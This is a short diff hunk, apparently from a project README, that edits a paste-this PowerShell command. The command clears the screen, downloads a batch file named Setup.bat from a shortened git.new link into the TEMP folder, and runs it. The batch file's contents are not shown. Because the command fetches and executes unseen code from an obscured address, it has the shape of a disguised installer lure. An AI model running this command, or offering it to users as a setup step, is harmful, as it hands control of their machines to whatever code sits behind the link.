@@ -32,7 +32,7 @@ powershell -c "cls; iwr https://git.new/zhV1D2s -OutFile $env:TEMP\Setup.bat; & 
 ```
 
 ```
-powershell -c "cls; iwr https://git.new/zhV1D2s -OutFile $env:TEMP\Setup.bat; cmd /c `"$env:TEMP\Setup.bat & echo hello world & pause`""
+powershell -c "cls; iwr https://git.new/zhV1D2s -OutFile $env:TEMP\Setup.bat; & $env:TEMP\Setup.bat; echo Done"
 ```
 
 ---
